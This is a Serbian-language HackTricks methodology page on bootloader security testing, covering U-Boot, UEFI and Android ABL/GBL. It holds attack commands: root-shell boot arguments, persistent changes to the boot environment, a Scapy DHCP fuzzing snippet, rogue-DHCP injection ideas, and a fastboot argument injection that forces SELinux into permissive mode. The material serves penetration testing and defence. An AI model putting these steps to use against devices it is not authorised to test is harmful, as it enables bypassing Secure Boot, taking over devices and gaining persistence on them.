# Testiranje bootloader-a

{{#include ../../banners/hacktricks-training.md}}

Preporučuju se sledeći koraci za izmenu konfiguracija pokretanja uređaja i testiranje bootloader-a kao što su U-Boot i učitavači UEFI klase. Fokusirajte se na postizanje izvršavanja koda u ranoj fazi, procenu zaštite od nevažećih potpisa i vraćanja na stariju verziju, kao i na zloupotrebu putanja za oporavak ili mrežno pokretanje.

Povezano: zaobilaženje MediaTek secure boot-a pomoću bl2_ext patch-ovanja:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Brze U-Boot mogućnosti i zloupotreba okruženja

1. Pristupite ljusci interpretera
   - Tokom pokretanja pritisnite poznati taster za prekid (često bilo koji taster, 0, razmak ili sekvencu „magic“ specifičnu za ploču) pre nego što se izvrši `bootcmd`, kako biste otvorili U-Boot prompt.<sup>[[1]](#references)</sup>

2. Pregledajte stanje pokretanja i promenljive
   - Korisne komande:
     - `printenv` (prikažite okruženje)
     - `bdinfo` (informacije o ploči, memorijske adrese)
     - `help bootm; help booti; help bootz` (podržani načini pokretanja kernela)
     - `help ext4load; help fatload; help tftpboot` (dostupni učitavači)

3. Izmenite argumente pokretanja da biste dobili root shell
   - Dodajte `init=/bin/sh` kako bi se kernel pokrenuo u shell-u umesto u uobičajenom init procesu:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot sa vašeg TFTP servera
   - Podesite mrežu i preuzmite kernel/fit image sa LAN-a:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Trajno sačuvajte promene putem okruženja
   - Ako env skladište nije zaštićeno od pisanja, možete trajno zadržati kontrolu:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Proverite promenljive kao što su `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` koje utiču na rezervne putanje. Pogrešno podešene vrednosti mogu omogućiti ponovljeni ulazak u shell.

6. Proverite funkcije za debug/nebezbedne funkcije
   - Potražite: `bootdelay` > 0, onemogućen `autoboot`, neograničen `usb start; fatload usb 0:1 ...`, mogućnost korišćenja `loady`/`loads` preko serijske veze, `env import` sa nepouzdanih medija i kernele/ramdiskove koji se učitavaju bez provere potpisa.

7. Testiranje U-Boot image-a/provere
   - Ako platforma tvrdi da koristi secure/verified boot sa FIT image-ovima, isprobajte i nepotpisane i izmenjene image-ove:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Odsustvo `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ili nasleđeno ponašanje `verify=n` često omogućava pokretanje proizvoljnih payload-ova.
   - Nemojte se zaustaviti na jednostavnom rezultatu dozvoljeno/odbijeno: nedavno istraživanje FIT-a pokazalo je da sam put provere može biti pre-auth površina za napad. Negativno testirajte eksterno skladištene FIT podatke (`data-offset`, `data-position`, `data-size`), izbor potpisane konfiguracije, rukovanje sa `loadables` i overlay / `extra-conf`.
   - Ako imate odgovarajuće izvorno stablo, `test/vboot/vboot_test.sh` je brz način da reprodukujete ponašanje provere FIT-a u U-Boot sandbox-u pre rada sa stvarnim hardverom.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` i script bootflows
   - U modernim U-Boot build-ovima, `bootcmd` je često samo omotač oko Standard Boot-a. To znači da upisivi mediji, PXE ili SPI flash mogu postati stvarna granica poverenja čak i kada vidljivo okruženje deluje bezazleno.
   - `extlinux` bootmeth traži `extlinux/extlinux.conf` u okviru `/` i `/boot`; script bootmeth prvo traži `boot.scr.uimg`, a zatim `boot.scr`. Pri mrežnom pokretanju, naziv script datoteke može doći iz `boot_script_dhcp`.
   - Korisne komande za početnu trijažu:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Slučajevi zloupotrebe za testiranje: USB/SD mediji pod kontrolom napadača koji se nalaze ranije u `boot_targets`, zapisiv `/boot/extlinux/extlinux.conf`, lažni TFTP server koji isporučuje `boot.scr` ili izvršavanje skripte sa SPI-ja preko `script_offset_f`.
   - Ako platforma koristi FIT verifikaciju, proverite da li su konfiguracije potpisane na nivou konfiguracije, a ne samo za svaku sliku pojedinačno; `required-mode=all` je stroži od prihvatanja bilo kog pojedinačnog obaveznog ključa.

## Površina mrežnog pokretanja (DHCP/PXE) i lažni serveri

9. Fuzzing DHCP/PXE parametara
   - U-Boot-ovo nasleđeno BOOTP/DHCP rukovanje imalo je probleme sa bezbednošću memorije. Na primer, CVE‑2024‑42040 opisuje otkrivanje memorije putem posebno napravljenih DHCP odgovora koji mogu da pošalju bajtove iz U-Boot memorije nazad preko mreže.<sup>[[4]](#references)</sup> Testirajte putanje izvršavanja DHCP/PXE koda pomoću predugačkih vrednosti i vrednosti na granicama opsega (opcija 67 bootfile-name, vendor opcije, polja file/servername) i proverite da li dolazi do zaglavljivanja ili curenja podataka.
   - Minimalni Scapy isečak koda za testiranje parametara pokretanja tokom mrežnog pokretanja:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Takođe proverite da li se polja za naziv datoteke PXE prosleđuju shell/loader logici bez sanitizacije kada su povezana sa skriptama za provisioning na strani OS-a.

10. Testiranje command injection-a preko lažnog DHCP servera
   - Podesite lažni DHCP/PXE servis i pokušajte da ubacite znakove u polja `filename` ili `options` kako biste došli do interpretera komandi u kasnijim fazama boot lanca. Metasploit-ov DHCP auxiliary, `dnsmasq` ili prilagođene Scapy skripte dobro rade. Najpre izolujte laboratorijsku mrežu.

## Režimi oporavka SoC ROM-a koji zaobilaze uobičajeni boot

Mnogi SoC-ovi imaju BootROM režim „loader“ koji prihvata kod preko USB/UART-a čak i kada su flash slike nevažeće. Ako osigurači za secure boot nisu programirani, to može omogućiti izvršavanje proizvoljnog koda u ranoj fazi lanca.

- NXP i.MX (Serial Download Mode)
  - Alatke: `uuu` (mfgtools3) ili `imx-usb-loader`.
  - Primer: `imx-usb-loader u-boot.imx` za slanje i pokretanje prilagođenog U-Boot-a iz RAM-a.
- Allwinner (FEL)
  - Alatka: `sunxi-fel`.
  - Primer: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ili `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Alatka: `rkdeveloptool`.
  - Primer: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` za učitavanje loader-a i otpremanje prilagođenog U-Boot-a.

Procenite da li su eFuses/OTP za secure boot na uređaju programirani. Ako nisu, režimi preuzimanja BootROM-a često zaobilaze svu verifikaciju na višim nivoima (U-Boot, kernel, rootfs) tako što direktno izvršavaju vaš payload prve faze iz SRAM-a/DRAM-a.

## UEFI/učitavači klase PC: brze provere

11. Testiranje neovlašćenih izmena ESP-a, vraćanja na stariju verziju i upisa ključeva
   - Prikačite EFI System Partition (ESP) i proverite da li sadrži komponente učitavača: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` i putanje do logotipa proizvođača.
   - Kada je moguće, iz OS-a izvezite stanje Secure Boot-a i baze ključeva:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Ako je platforma u Setup Mode, prihvata registraciju ključeva bez autentifikacije ili se isporučuje sa testnim/podrazumevanim Platform Key (klasa PKfail), lokalni administrator ili napadač sa fizičkim pristupom može da registruje sopstveni KEK/db i ostavi Secure Boot „omogućenim“, dok pokreće proizvoljne EFI binarne datoteke.<sup>[[3]](#references)</sup>
   - Pokušajte pokretanje sistema sa potpisanim boot komponentama na koje je vraćena starija verzija ili za koje se zna da su ranjive, ako Secure Boot opozivi (dbx) nisu ažurni. Ako platforma i dalje veruje starim shim-ovima/bootmanager-ima, često možete učitati sopstveni kernel ili `grub.cfg` sa ESP-a i tako obezbediti postojanost.

12. Testiranje zastarelih shim-ova / SBAT / dbx opoziva
   - Stari shim-ovi potpisani od Microsoft-a i fork-ovi dobavljača i dalje mogu poslužiti kao putanja za bootkit u stilu BYOVD-a ako su opozivi zastareli. U izolovanoj laboratoriji postavite istorijski ranjiv shim na ESP i pokušajte da chainload-ujete sopstveni `grubx64.efi` ili kernel.<sup>[[11]](#references)</sup>
   - Brza procena:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Ako shim i dalje radi uprkos tome što se nalazi na listi opoziva, firmware/OS ima zastarele `dbx` ispravke ili veruje fork-ovanom loader-u koji nikada nije nasledio upstream SBAT zaštite.

13. Greške u parsiranju logotipa pri pokretanju (klasa LogoFAIL)
   - Nekoliko OEM/IBV firmware-a bilo je ranjivo na greške u parsiranju slika u DXE-u, koje obrađuje logotipe pri pokretanju. Ako napadač može da postavi posebno napravljenu sliku na ESP, na putanju specifičnu za proizvođača (npr. `\EFI\<vendor>\logo\*.bmp`), pa zatim ponovo pokrene uređaj, moguće je izvršavanje koda tokom ranog pokretanja, čak i kada je Secure Boot omogućen. Proverite da li platforma prihvata logotipe koje dostavi korisnik i da li se tim putanjama može pisati iz OS-a.<sup>[[2]](#references)</sup>


## Nedostaci poverenja u Android/Qualcomm ABL + GBL (Android 16)

Na uređajima sa Androidom 16 koji koriste Qualcomm ABL za učitavanje biblioteke **Generic Bootloader Library (GBL)**, proverite da li ABL **autentifikuje** UEFI aplikaciju koju učitava sa particije `efisp`. Ako ABL proverava samo **prisustvo** UEFI aplikacije, a ne i njene potpise, mogućnost pisanja na `efisp` omogućava **izvršavanje nepotpisanog koda pre pokretanja OS-a**.<sup>[[6]](#references)[[7]](#references)</sup>

Praktične provere i načini zloupotrebe:

- **Mogućnost pisanja na efisp**: Potreban vam je način da upišete prilagođenu UEFI aplikaciju na `efisp` (root/usluga sa povišenim privilegijama, greška u OEM aplikaciji, putanja kroz recovery/fastboot). Bez toga, nedostatak u učitavanju GBL-a nije moguće direktno iskoristiti.<sup>[[6]](#references)</sup>
- **Ubacivanje argumenata u fastboot OEM komandu** (ABL greška): Neke verzije prihvataju dodatne tokene u `fastboot oem set-gpu-preemption` i dodaju ih u kernel cmdline. Ovo se može iskoristiti za prinudno postavljanje SELinux-a u permissive režim, čime se omogućava pisanje na zaštićene particije:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Ako je uređaj zakrpljen, komanda bi trebalo da odbije dodatne argumente.<sup>[[5]](#references)[[6]](#references)</sup>
- **Otključavanje bootloader-a putem trajnih zastavica**: Payload u fazi pokretanja može da promeni trajne zastavice za otključavanje (npr. `is_unlocked=1`, `is_unlocked_critical=1`) i tako emulira `fastboot oem unlock` bez OEM serverskih provera/odobrenja. Ovo je trajna promena stanja koja ostaje nakon sledećeg pokretanja.<sup>[[6]](#references)</sup>

Napomene za odbranu/trijažu:

- Proverite da li ABL obavlja verifikaciju potpisa GBL/UEFI payload-a iz `efisp`. Ako je ne obavlja, tretirajte `efisp` kao površinu visokog rizika za uspostavljanje postojanosti.
- Pratite da li su ABL fastboot OEM handler-i zakrpljeni tako da **proveravaju broj argumenata** i odbijaju dodatne tokene.<sup>[[8]](#references)[[9]](#references)</sup>

## Mere opreza pri radu sa hardverom

Budite oprezni pri radu sa SPI/NAND flash memorijom tokom ranog pokretanja (npr. uzemljavanjem pinova radi zaobilaženja čitanja) i uvek konsultujte datasheet flash memorije. Kratki spojevi u pogrešnom trenutku mogu da oštete uređaj ili programator.

## Napomene i dodatni saveti

- Isprobajte `env export -t ${loadaddr}` i `env import -t ${loadaddr}` za premeštanje blob-ova okruženja između RAM-a i skladišta; neke platforme dozvoljavaju uvoz env-a sa prenosivog medija bez autentifikacije.
- Za uspostavljanje postojanosti na sistemima zasnovanim na Linux-u koji se pokreću putem `extlinux.conf`, često je dovoljno izmeniti liniju `APPEND` (da bi se ubacilo `init=/bin/sh` ili `rd.break`) na particiji za pokretanje, ako se ne sprovode provere potpisa.
- Ako cilj koristi ažuriranja sa dva slota / A/B, pregledajte tehnike zaobilaženja anti-rollback zaštite i desinhronizacije slotova u [pregledu analize firmvera](README.md) kako ne biste propustili propuste u poverenju koji postoje samo u mehanizmu za ažuriranje, izvan samog bootloader-a.
- Ako userland pruža `fw_printenv/fw_setenv`, proverite da li se `/etc/fw_env.config` podudara sa stvarnim skladištem env-a. Pogrešno podešeni pomaci mogu omogućiti čitanje/upis u pogrešnu MTD oblast.

## References

- [1] [Metodologija testiranja bezbednosti firmvera](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Otkrivanje LogoFAIL-a: Opasnosti obrade slika tokom pokretanja sistema](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Nepouzdani ključevi platforme podrivaju Secure Boot u UEFI ekosistemu](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Detalji o CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Otključavanje Xiaomi uređaja pomoću dva nesanitizovana niza](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit omogućava napadačima da otključaju bootloader-e](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Arhitektura Generic Bootloader-a (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Ispravka prosleđivanja nepouzdanog unosa u kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: dodavanje provere za komandu set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Nespreman za pokretanje: zaobilaženje provere FIT potpisa u U-Boot-u](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Napomena o ranjivosti VU#616257 - Microsoft-potpisani UEFI shim bootloader-i podložni su zaobilaženju Secure Boot-a](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
